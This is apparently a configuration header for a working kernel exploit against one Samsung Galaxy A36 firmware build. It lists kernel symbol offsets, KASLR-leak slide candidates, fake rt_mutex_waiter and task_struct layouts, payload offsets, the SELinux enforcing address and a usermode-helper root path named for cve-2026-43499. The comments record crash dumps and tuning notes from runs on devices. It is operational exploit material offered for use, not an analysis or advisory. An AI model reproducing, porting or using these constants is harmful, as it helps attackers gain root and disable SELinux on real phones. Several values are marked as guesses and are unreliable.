#ifndef OFFSET_H
#define OFFSET_H

/*
 * target.h - Samsung Galaxy A36 5G (SM-A366B, Qualcomm parrot/parrotp)
 * Linux 6.6.98-android15-8
 * Kernel: abogkiA366BXXSACZF1
 * Generated: July 2026
 *
 * All function/data offsets verified from vmlinux.nm / vmlinux.elf.
 * Structure field offsets verified from A36-native BTF (vmlinux.btf,
 *   extracted from the boot-image kernel) and A36 disassembly.
 * Physical address constants are initial guesses - verify on device.
 * SLIDE_NFULNL_LOGGER_NAME and SLIDE_NFULNL_LOGGER_OBJECT confirmed
 *   via direct ELF data read.
 * SELINUX_ENFORCING points to selinux_state.enforcing (first field).
 * P0_PHYS_OFFSET 0x80000000 = memstart_addr (RAM base at phys 0x80000000),
 *   matching the A36 kernel boot print "PHYS_OFFSET: 0x80000000"
 *   (dumpstate_lastkmsg_9:15418) and the e3q/S928U1 constants exactly.
 *   With the old 0x0 the p0-oracle PROBE parent
 *   (P0_DATA_ALIAS_CONST(KIMAGE_TEXT_BASE) + P0_ORACLE_PROBE_OFFSET)
 *   computed to linear 0xffffff8080270000 -> vmemmap slot 0x80270
 *   (VA 0xfffffffe02009c00), which is NOT populated in this kernel (that
 *   phys window is not RAM) -> level-2 translation fault at 0xfffffffe02009c10,
 *   seen in BOTH RWC=8 and RWC=9 dumps (pc: rb_erase+0x94, pmd=0).
 *   With 0x80000000 the probe parent becomes slot 0x270
 *   (vmemmap 0xfffffffe00009c00) and P0_KERNEL_PHYS_DELTA = 0x80000,
 *   identical to e3q-S928USQS6DZF2, which works. The earlier "memstart=0"
 *   conclusion from the first-run zeroed probe page was wrong.
 * P0_KERNEL_PHYS_LOAD 0x80080000 = loader region base 0x80000000 + 0x00080000,
 *   matching the A36 LinuxLoader ARM64 load constants read at .rdata
 *   0xf2954 (0x00080000) / 0xf2958 (0x05600000) in BootLinux (sub_0x7BCC),
 *   identical to the S928U1/e3q values (see docs/SM-S928U1-S928U1UES6DZF2.md).
 *   0x80080000 remains the best guess. If the device panics, try 0xa8000000.
 *
 * A36 verification sources (all from the A366BXXSACZF1 kernel itself):
 *  - task_struct: BTF (usage@0x40 prio@0x84 normal_prio@0x8c
 *    sched_task_group@0x348 pi_lock@0x90c pi_waiters@0x920
 *    pi_top_task@0x930 pi_blocked_on@0x938).
 *  - rt_mutex_waiter / rt_waiter_node: BTF (6.6 rt_waiter_node layout).
 *  - configfs_buffer: BTF (page@0x10 needs_read_fill@0x50
 *    bin_buffer@0x58 bin_buffer_size@0x60 cb_max_size@0x64;
 *    Samsung mutex is 0x30, size 0x80).
 *  - workqueue_struct / pool_workqueue / worker_pool: NOT in A36 BTF
 *    (forward decls only). Verified from A36 disassembly instead:
 *    apply_wqattrs_commit stores wq->dfl_pwq @0xb0; pwq_adjust_max_active
 *    reads pwq->pool @0x0 pwq->wq @0x8 nr_active @0x5c max_active @0x60;
 *    init_worker_pool sets pool->worklist @0x28; worker_enter_idle
 *    incs pool->nr_idle @0x3c.
 *  - work_struct, struct page, file_operations, pipe_buffer: BTF.
 */

#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define BUILD_VARIANT_LABEL "parrotp-A366BXXSACZF1-app-physical-p0-oracle"
#define APP_PHYS_P0_ORACLE 1
#else
#define BUILD_VARIANT_LABEL "parrotp-A366BXXSACZF1-root-umh"
#endif
#ifndef BUILD_FINGERPRINT
#define BUILD_FINGERPRINT \
  "samsung/a36xxx/a36:16/BP4A.251205.006/A366BXXSACZF1:user/release-keys"
#endif

/* ===== KERNEL ADDRESS CONSTANTS ===== */
#define KIMAGE_TEXT_BASE      0xffffffc080000000ULL
#define P0_PAGE_OFFSET        0xffffff8000000000ULL
#define P0_PHYS_OFFSET        0x80000000ULL             /* memstart_addr (RAM base phys 0x80000000), matches boot print + e3q. Old 0x0 -> probe parent slot 0x80270 (vmemmap 0xfffffffe02009c00) unmapped -> fault; 0x80000000 -> slot 0x270 (mapped) */
#define P0_KERNEL_PHYS_LOAD   0x80080000ULL             /* 0x80000000 + 0x80000 (LinuxLoader .rdata 0xf2954); GUESS: verify on device */
#define SKB_DATA_DELTA        (-0xe80LL)                /* GUESS: try -0xe80 */
/* A36 linear (direct) map has a pmd hole at phys 0x82600000-0x82800000
 * (crash at ffffff80026ac360, rb_erase+0x8c via rt_mutex_adjust_pi), so
 * slid linear aliases of late-.data targets (ashmem_misc @phys 0x826ac360,
 * selinux_state @0x8270c598) are unmapped. data_addr() must use the kernel
 * image VA (KIMAGE_TEXT_BASE + slide + off), which is always mapped. */
#define P0_DATA_ADDR_AS_TEXT 1

/* ===== KASLR LEAK PARAMETERS ===== */
#define SLIDE_FAKE_WAITER_PRIO  0
#define SLIDE_WAITER_WAKE_STATE 0
#define SLIDE_LOCK_OWNER_VALUE  1ULL
#define SLIDE_USE_FAKE_TASK     1
/* A36: sched_blocked_reason is entry 89 of the ftrace_events section
 * (__start_ftrace_events 0xffffffc08228d4c0..0xffffffc08228f9f0,
 *  __event_sched_blocked_reason @0xffffffc08228d788) -> id = 20 + 89 = 109. */
#define SLIDE_TRACEFS_EVENT_ID         109

/* A36 vmlinux.nm: sched_blocked_reason caller offset (worker_thread -> schedule) */
#define SLIDE_TRACEFS_WORKER_CALLER_OFF  0x000d97ecULL

#define SLIDE_P0_OFFSET_CANDIDATES \
  0x150000ULL, 0x100000ULL, 0x130000ULL, 0x090000ULL, \
  0x1c0000ULL, 0x180000ULL, 0x050000ULL, 0x1a0000ULL, \
  0x160000ULL, 0x0e0000ULL, 0x1e0000ULL, 0x000000ULL, \
  0x010000ULL, 0x020000ULL, 0x030000ULL, 0x040000ULL, \
  0x060000ULL, 0x070000ULL, 0x080000ULL, 0x0a0000ULL, \
  0x0c0000ULL, 0x0d0000ULL, 0x0f0000ULL, 0x110000ULL, \
  0x120000ULL, 0x0b0000ULL, 0x170000ULL, 0x140000ULL, \
  0x190000ULL, 0x1b0000ULL, 0x1d0000ULL, 0x1f0000ULL
#define SLIDE_MAX_ATTEMPTS 32

/* ===== APP MODE PARAMETERS ===== */
#if defined(APP_PAYLOAD) && APP_PAYLOAD
#define ROUTE_WAIT_SECONDS             8
#define PSELECT_ENTER_DELAY_USEC       50000
#define SLIDE_PSELECT_TIMEOUT_NSEC     100000000L
#define SLIDE_KSNITCH_APPENDED_FUTEXES 2048
#define SLIDE_KSNITCH_REPEAT_MEASUREMENT 64
#define SLIDE_KSNITCH_AVERAGE          8
#define SLIDE_PHYSICAL_SLOT_DELAYS_USEC \
  20000, 20000, 20000, 20000, 20000, 20000, 20000, 20000
#define APP_PAYLOAD_ATTEMPT_DELAYS_USEC 25000, 20000, 30000, 50000
#define APP_FOPS_ROUTE_USE_PSELECT_DELAY 1
#define SLIDE_BANK_SLOTS               4
#define SLIDE_BANK_TASK_OFF            0x1000
#define SLIDE_BANK_TASK_STRIDE         0x1c0
#define SLIDE_BANK_LOCK_OFF            0x5200
#define SLIDE_BANK_SLOT_STRIDE         0x100
#define SLIDE_BANK_WAITER_OFF          0x40
#define P0_ORACLE_GATE_SLOT            0
#define P0_ORACLE_PROBE_SLOT           1
#define P0_ORACLE_GATE_RESTORE_SLOT    2
#define P0_ORACLE_PROBE_RESTORE_SLOT   3
#define P0_ORACLE_GATE_PAGE_OFF        0x0e80
#define P0_ORACLE_GATE_OBJECT_INDEX    1
#define P0_ORACLE_PROBE_OFFSET         0x1f0000ULL
#define P0_FINGERPRINT_HEADER \
  "targets/parrotp-A366BXXSACZF1/p0_fingerprint.h"
#endif

/* ===== DIRECT MAP / VMEMMAP ===== */
#define KERNELSNITCH_IDENTITY_START  0xffffff8000000000ULL
#define KERNELSNITCH_IDENTITY_END    0xffffff9000000000ULL
#define DIRECT_MAP_BASE              0xffffff8000000000ULL
#define DIRECT_MAP_END               0xffffff9000000000ULL
#define VMEMMAP_START                0xfffffffe00000000ULL

/* ===== ASHMEM SYMBOL OFFSETS ===== */
/* Verified from vmlinux.nm */
#define ASHMEM_MISC_FOPS_OFF         0x0244c360ULL  /* ashmem_misc */
#define ASHMEM_FOPS_OFF              0x013fad80ULL  /* ashmem_fops */
#define ASHMEM_IOCTL_OFF             0x00d60b8cULL  /* t ashmem_ioctl */
#define ASHMEM_COMPAT_IOCTL_OFF      0x00d61248ULL  /* t compat_ashmem_ioctl */
#define ASHMEM_MMAP_OFF              0x00d6129cULL  /* t ashmem_mmap */
#define ASHMEM_OPEN_OFF              0x00d614bcULL  /* t ashmem_open */
#define ASHMEM_RELEASE_OFF           0x00d61544ULL  /* t ashmem_release */
#define ASHMEM_SHOW_FDINFO_OFF       0x00d615d0ULL  /* t ashmem_show_fdinfo */

#define ASHMEM_MISC_FOPS             (KIMAGE_TEXT_BASE + ASHMEM_MISC_FOPS_OFF)
#define ASHMEM_FOPS                  (KIMAGE_TEXT_BASE + ASHMEM_FOPS_OFF)
#define ASHMEM_IOCTL                 (KIMAGE_TEXT_BASE + ASHMEM_IOCTL_OFF)
#define ASHMEM_COMPAT_IOCTL          (KIMAGE_TEXT_BASE + ASHMEM_COMPAT_IOCTL_OFF)
#define ASHMEM_MMAP                  (KIMAGE_TEXT_BASE + ASHMEM_MMAP_OFF)
#define ASHMEM_OPEN                  (KIMAGE_TEXT_BASE + ASHMEM_OPEN_OFF)
#define ASHMEM_RELEASE               (KIMAGE_TEXT_BASE + ASHMEM_RELEASE_OFF)
#define ASHMEM_SHOW_FDINFO           (KIMAGE_TEXT_BASE + ASHMEM_SHOW_FDINFO_OFF)

/* ===== KERNEL FUNCTION OFFSETS ===== */
/* All verified from vmlinux.nm */
#define CONFIGFS_READ_ITER_OFF        0x00491934ULL  /* t configfs_read_iter */
#define CONFIGFS_BIN_WRITE_ITER_OFF   0x00491e60ULL  /* t configfs_bin_write_iter */
#define COPY_SPLICE_READ_OFF          0x00415044ULL  /* T copy_splice_read */
#define NOOP_LLSEEK_OFF               0x003c7b24ULL  /* T noop_llseek */
#define INIT_TASK_OFF                 0x022de340ULL  /* T init_task */
#define ROOT_TASK_GROUP_OFF           0x024ea580ULL  /* T root_task_group */

/*
 * selinux_enforcing not in symbol table (static).
 * Using selinux_state.address (first field = enforcing at offset 0).
 * Verified A36-native: BTF struct selinux_state size 0x80, enforcing@0x0
 *   initialized@0x1 policycap[8]@0x2 netlink_route@0xa netlink_getneigh@0xb
 *   status_page@0x10 status_lock@0x18 policy@0x48 policy_mutex@0x50.
 *   Disassembly: memset(selinux_state,0,0x80) at selinux_state_init;
 *   ldrb [x20] enforcing read; __traceiter_android_rvh_selinux_is_initialized.
 */
#define SELINUX_ENFORCING_OFF         0x0252c598ULL  /* selinux_state */

#define KMALLOC_CACHES_OFF            0x017c5b10ULL  /* T kmalloc_caches */
#define ANON_PIPE_BUF_OPS_OFF         0x0123cc48ULL  /* t anon_pipe_buf_ops */

#define CONFIGFS_READ_ITER            (KIMAGE_TEXT_BASE + CONFIGFS_READ_ITER_OFF)
#define CONFIGFS_BIN_WRITE_ITER       (KIMAGE_TEXT_BASE + CONFIGFS_BIN_WRITE_ITER_OFF)
#define COPY_SPLICE_READ              (KIMAGE_TEXT_BASE + COPY_SPLICE_READ_OFF)
#define NOOP_LLSEEK                   (KIMAGE_TEXT_BASE + NOOP_LLSEEK_OFF)
#define INIT_TASK                     (KIMAGE_TEXT_BASE + INIT_TASK_OFF)
#define ROOT_TASK_GROUP               (KIMAGE_TEXT_BASE + ROOT_TASK_GROUP_OFF)
#define SELINUX_ENFORCING             (KIMAGE_TEXT_BASE + SELINUX_ENFORCING_OFF)
#define KMALLOC_CACHES                (KIMAGE_TEXT_BASE + KMALLOC_CACHES_OFF)
#define ANON_PIPE_BUF_OPS             (KIMAGE_TEXT_BASE + ANON_PIPE_BUF_OPS_OFF)

/* ===== UMH ROOT ===== */
#define ROOT_UMH_PATH                "/data/local/tmp/cve-2026-43499-root"
#define CALL_USERMODEHELPER_EXEC_WORK_OFF  0x000d0fa4ULL  /* t */
/* system_unbound_wq: EXPORTED GLOBAL pointer at 0x022cae60. Verified A36-native:
 *   __ksymtab P REL32 decode -> value 0xffffffc0822cae60 name "system_unbound_wq";
 *   workqueue_init_early @0xffffffc081ea14b4 calls
 *   alloc_workqueue("events_unbound", WQ_UNBOUND=0x2, 0x200=WQ_UNBOUND_MAX_ACTIVE)
 *   and stores the result at [x22,#0xe60] = 0xffffffc0822cae60. One of the 7
 *   system_*_wq pointer globals (system_wq..system_freezable_power_efficient_wq). */
#define SYSTEM_UNBOUND_WQ_OFF         0x022cae60ULL  /* T system_unbound_wq */
#define CALL_USERMODEHELPER_EXEC_WORK \
  (KIMAGE_TEXT_BASE + CALL_USERMODEHELPER_EXEC_WORK_OFF)
#define SYSTEM_UNBOUND_WQ            (KIMAGE_TEXT_BASE + SYSTEM_UNBOUND_WQ_OFF)
#define ROOT_UMH_WORK_OFF             0x6000
#define ROOT_UMH_DATA_OFF             0x6200

/* ===== SLIDE KASLR LEAK ===== */
/*
 * SLIDE_NFULNL_LOGGER_NAME: verified by reading nfulnl_logger struct
 *   first qword -> "nfnetlink_log" string at 0x0174a916.
 * SLIDE_NFULNL_LOGGER_OBJECT: nfulnl_logger at 0x022d2278.
 * loggers[] array at 0x022d21c0 (NULL at boot time; populated at runtime).
 */
#define SLIDE_NFULNL_LOGGER_NAME_OFF  0x0174a916ULL
#define SLIDE_NFULNL_LOGGER_OBJECT_OFF 0x022d2278ULL
#define SLIDE_RB_PARENT_TYPE_RESTORE  1ULL
#define SLIDE_INIT_TASK_OFF           INIT_TASK_OFF
#define SLIDE_ROOT_TASK_GROUP_OFF     ROOT_TASK_GROUP_OFF

/*
 * Verified by reading random_table[4] (ctl_table for "boot_id"):
 *   procname="boot_id", data=sysctl_bootid (0x0260f1a0).
 *   data_ptr field is at random_table + 4*64 + 8 = 0x024090c0.
 */
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF  0x024090c0ULL
#define SLIDE_SYSCTL_BOOTID_OFF                  0x0260f1a0ULL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_NAME_OFF)
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_NFULNL_LOGGER_OBJECT_OFF)
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE \
  (KIMAGE_TEXT_BASE + SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_OFF)
#define SLIDE_INIT_TASK_IMAGE          (KIMAGE_TEXT_BASE + SLIDE_INIT_TASK_OFF)
#define SLIDE_ROOT_TASK_GROUP_IMAGE    (KIMAGE_TEXT_BASE + SLIDE_ROOT_TASK_GROUP_OFF)
#define SLIDE_SYSCTL_BOOTID_IMAGE      (KIMAGE_TEXT_BASE + SLIDE_SYSCTL_BOOTID_OFF)

/* ===== FAKE PAYLOAD LAYOUT ===== */
#define LOCK_OFF       0x2210
#define W0_OFF         0x2350
#define FOPS_OFF       0x2000
#define SCRATCH_OFF    0x3000
#define RIGHT_OFF      0x4440
#define LEFT_OFF       0x5550
#define FAKE_TASK_OFF  0x3200

/* ===== FAKE RT_MUTEX_WAITER LAYOUT ===== */
/* Verified A36-native BTF (kernel 6.6 rt_waiter_node layout):
 * struct rt_waiter_node { rb_node entry@0x0; int prio@0x18; u64 deadline@0x20; } (0x28)
 * struct rt_mutex_waiter { tree@0x0; pi_tree@0x28; task@0x50; lock@0x58;
 *                          wake_state@0x60; ww_ctx@0x68; } (0x70)
 */
#define FAKE_WAITER_TREE_PRIO_OFF       0x18
#define FAKE_WAITER_TREE_DEADLINE_OFF   0x20
#define FAKE_WAITER_PI_TREE_ENTRY_OFF   0x28
#define FAKE_WAITER_PI_TREE_PRIO_OFF    0x40
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF 0x48
#define FAKE_WAITER_TASK_OFF            0x50
#define FAKE_WAITER_LOCK_OFF            0x58
#define FAKE_WAITER_WAKE_STATE_OFF      0x60
#define FAKE_WAITER_WW_CTX_OFF          0x68

/* ===== FAKE TASK STRUCT OFFSETS ===== */
/* Verified A36-native BTF (struct task_struct size 0x12c0) */
#define FAKE_TASK_USAGE_OFF             0x40
#define FAKE_TASK_PRIO_OFF              0x84
#define FAKE_TASK_NORMAL_PRIO_OFF       0x8c
#define FAKE_TASK_TASK_GROUP_OFF        0x348
#define FAKE_TASK_PI_LOCK_OFF           0x90c
#define FAKE_TASK_PI_WAITERS_OFF        0x920
#define FAKE_TASK_PI_TOP_TASK_OFF       0x930
#define FAKE_TASK_PI_BLOCKED_ON_OFF     0x938

/* ===== CONFIGFS STRUCTURE OFFSETS ===== */
/* Verified A36-native BTF (struct configfs_buffer size 0x80) */
#define CFG_PAGE_OFF                   16
#define CFG_NEEDS_READ_FILL_OFF         80
#define CFG_BIN_BUFFER_OFF              88
#define CFG_BIN_BUFFER_SIZE_OFF         96
#define CFG_CB_MAX_SIZE_OFF             100

/* ===== WORKQUEUE STRUCTURE OFFSETS ===== */
/* Verified from A36 disassembly (structs absent from A36 BTF):
 *   apply_wqattrs_commit:  wq->dfl_pwq store @0xb0
 *   pwq_adjust_max_active: pwq->pool @0x0, pwq->wq @0x8,
 *                          pwq->nr_active @0x5c, pwq->max_active @0x60
 *   pwq_dec_nr_in_flight:  pwq->refcnt @0x18, nr_in_flight @0x1c,
 *                          work_color @0x10, flush_color @0x14
 *   init_worker_pool:      pool->worklist @0x28
 *   worker_enter_idle:     pool->nr_idle @0x3c
 */
#define WQ_DFL_PWQ_OFF                 0xb0
#define PWQ_POOL_OFF                   0x00
#define PWQ_WQ_OFF                     0x08
#define PWQ_WORK_COLOR_OFF             0x10
#define PWQ_REFCNT_OFF                 0x18
#define PWQ_NR_IN_FLIGHT_OFF           0x1c
#define PWQ_NR_ACTIVE_OFF              0x5c
#define PWQ_MAX_ACTIVE_OFF             0x60
#define POOL_WORKLIST_OFF              0x28
#define POOL_NR_IDLE_OFF               0x3c

/* ===== WORK STRUCT OFFSETS ===== */
/* Verified A36-native BTF (struct work_struct size 0x30) */
#define WORK_DATA_OFF                  0x00
#define WORK_ENTRY_OFF                 0x08
#define WORK_FUNC_OFF                  0x18

/* ===== STRUCT PAGE OFFSETS ===== */
/* Verified A36-native BTF (struct page size 0x40) */
#define STRUCT_PAGE_SIZE               0x40
#define STRUCT_PAGE_COMPOUND_HEAD_OFF  0x08
#define STRUCT_SLAB_CACHE_OFF          0x08
#define STRUCT_PAGE_TYPE_OFF           0x30

/* ===== PIPE CONSTANTS ===== */
/* pipe_buffer BTF: page@0x0 offset@0x8 len@0xc ops@0x10 flags@0x14 private@0x18
 * PIPE_BUFFER_SLOTS is the runtime pipe ring size (pa3q value; not in BTF). */
#define PIPE_BUFFER_SLOTS              32
#define PIPE_BUF_FLAG_CAN_MERGE        0x10

/* ===== FILE_OPERATIONS OFFSETS ===== */
/* Verified A36-native BTF (struct file_operations size 0x108) */
#define FOPS_OWNER_OFF                 0x00
#define FOPS_LLSEEK_OFF                0x08
#define FOPS_READ_OFF                  0x10
#define FOPS_WRITE_OFF                 0x18
#define FOPS_READ_ITER_OFF             0x20
#define FOPS_WRITE_ITER_OFF            0x28
#define FOPS_IOCTL_OFF                 0x48
#define FOPS_COMPAT_IOCTL_OFF          0x50
#define FOPS_MMAP_OFF                  0x58
#define FOPS_OPEN_OFF                  0x68
#define FOPS_RELEASE_OFF               0x78
#define FOPS_SPLICE_READ_OFF           0xb8
#define FOPS_SHOW_FDINFO_OFF           0xd8

#endif /* OFFSET_H */
